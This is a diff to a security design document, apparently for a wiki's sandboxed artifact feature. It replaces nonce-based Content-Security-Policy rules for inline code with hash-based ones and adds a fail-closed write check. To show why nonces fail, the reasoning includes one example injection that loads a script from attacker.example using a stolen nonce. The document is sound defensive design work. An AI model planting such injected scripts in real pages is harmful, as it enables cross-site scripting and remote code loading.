@@ -142,8 +142,8 @@ Artifact responses carry:
 ```
 Content-Security-Policy:
   default-src 'none';
-  script-src 'nonce-{n}';
-  style-src  'nonce-{n}' [https://fonts.googleapis.com];
+  script-src 'sha256-…' …;
+  style-src  'sha256-…' … [https://fonts.googleapis.com];
   img-src    data: blob:;
   font-src   [https://fonts.gstatic.com];
   connect-src 'none';
@@ -156,7 +156,13 @@ X-Content-Type-Options: nosniff
 Cache-Control: private, immutable
 ```
 
-The two font origins in brackets are present only when the web-font setting is enabled; with it off, `style-src` carries the nonce alone and `font-src` is absent, leaving `default-src 'none'` to cover it. They are the only values in this policy an operator can influence.
+The two font origins in brackets are present only when the web-font setting is enabled; with it off, `style-src` carries the hashes alone and `font-src` is absent, leaving `default-src 'none'` to cover it. They are the only values in this policy an operator can influence.
+
+**Inline code is authorised by hash, not by nonce.** An earlier draft used a per-revision nonce: ingest generated one, injected it onto every accepted inline `<script>` and `<style>`, and recorded it in a reserved `<meta>` so delivery could emit `script-src 'nonce-…'` without reparsing the body. That design is unsound, and the flaw is fatal rather than incidental. A nonce authorises *an element that carries it*, whatever that element loads; and the nonce has to be readable, because it sits in the served bytes. An accepted inline script can therefore read it and append `<script nonce="…" src="https://attacker.example/x.js">`, which the policy then authorises. Every external reference this design rejects at ingest becomes reachable at runtime, which empties the self-contained guarantee of its meaning.
+
+A hash has no such property. `'sha256-…'` matches one exact body of inline code and nothing else, so an attacker-authored element — external or inline — matches no hash and does not run. Ingest computes the digest of each accepted inline block and records the set in the reserved `<meta>`; delivery reads that marker and emits the hashes, still serving the stored bytes unchanged. No attribute is injected onto the blocks themselves.
+
+The change also removes a defect in the authoring loop. With a nonce, the served bytes carried a value the author was forbidden to send back, so the ordinary fetch–edit–save cycle over MCP or the CLI failed on every attempt. Hashes are derived from content, so ingest simply discards any reserved marker on input and recomputes it: a forged marker is not a threat to be rejected, it is a value about to be overwritten.
 
 `connect-src 'none'` is the directive that matters most. With it in place, an artifact cannot call the Crowi API and cannot open a scripted connection to a third-party endpoint.
 
@@ -246,6 +252,8 @@ The shell displays a persistent indicator that the frame contains sandboxed, age
 **`connect-src 'none'` is non-negotiable.** No artifact-side feature justifying its relaxation has been identified.
 
 **Mode A recommended, Mode B permitted, neither default.** Absent explicit configuration, artifacts do not render. Unsandboxed same-origin delivery is never reachable by configuration.
+
+**A write is refused before the deployment can serve it.** "Artifacts do not render" is not sufficient on its own: a deployment with no delivery mode configured would otherwise accumulate stored, executable documents it has no safe way to show, and the operator would discover the problem only when someone opened one. The check that decides whether artifact writes are permitted is therefore a small shared policy — a single fail-closed answer to "is artifact delivery configured" — that ingest consults before storing anything. It is introduced with the ingest work rather than with delivery, because that is where the first durable artifact would otherwise be created.
 
 **Signing key derived via HKDF, not the raw application secret.** Consistent with the finding in RFC-0014 review.
 
